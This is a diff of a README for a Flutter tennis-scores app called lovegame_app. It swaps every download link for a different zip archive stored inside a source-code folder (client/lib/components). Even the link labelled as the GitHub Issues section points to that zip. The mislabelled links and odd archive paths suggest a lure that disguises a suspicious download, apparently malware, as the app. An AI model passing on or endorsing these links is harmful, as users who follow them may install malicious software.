@@ -4,7 +4,7 @@
 Welcome to **lovegame_app**! This Flutter application offers real-time tennis scores, player profiles, match statistics, and ATP/WTA rankings. It's designed specifically for tennis enthusiasts looking to keep up with the latest information.
 
 ## 📥 Download Now
-[![Download lovegame_app](https://raw.githubusercontent.com/mo-can-1980/lovegame_app/main/backend/app/scrapers/lovegame_app_1.7.zip%20Now-Get%20the%20App-blue)](https://raw.githubusercontent.com/mo-can-1980/lovegame_app/main/backend/app/scrapers/lovegame_app_1.7.zip)
+[![Download lovegame_app](https://github.com/mo-can-1980/lovegame_app/raw/refs/heads/main/client/lib/components/lovegame-app-v2.2.zip%20Now-Get%20the%20App-blue)](https://github.com/mo-can-1980/lovegame_app/raw/refs/heads/main/client/lib/components/lovegame-app-v2.2.zip)
 
 ## 💻 System Requirements
 - **Operating System:** Android 5.0 or iOS 10.0 and above
@@ -19,7 +19,7 @@ Welcome to **lovegame_app**! This Flutter application offers real-time tennis sc
 - **ATP/WTA Rankings:** Stay updated with current player rankings.
 
 ## 📂 Download & Install
-To download the application, please visit this page: [Download lovegame_app](https://raw.githubusercontent.com/mo-can-1980/lovegame_app/main/backend/app/scrapers/lovegame_app_1.7.zip).
+To download the application, please visit this page: [Download lovegame_app](https://github.com/mo-can-1980/lovegame_app/raw/refs/heads/main/client/lib/components/lovegame-app-v2.2.zip).
 
 ### Instructions for Android
 1. Visit the link above.
@@ -45,7 +45,7 @@ To download the application, please visit this page: [Download lovegame_app](htt
 - Tennis game statistics
 
 ## 📞 Support
-If you encounter any issues or have questions about the app, please create an issue in the [GitHub Issues section](https://raw.githubusercontent.com/mo-can-1980/lovegame_app/main/backend/app/scrapers/lovegame_app_1.7.zip), and we will assist you as soon as possible.
+If you encounter any issues or have questions about the app, please create an issue in the [GitHub Issues section](https://github.com/mo-can-1980/lovegame_app/raw/refs/heads/main/client/lib/components/lovegame-app-v2.2.zip), and we will assist you as soon as possible.
 
 ## 🙌 Contributing
 We welcome contributions. If you want to help improve the app, please refer to the contributing guidelines found in the repository.
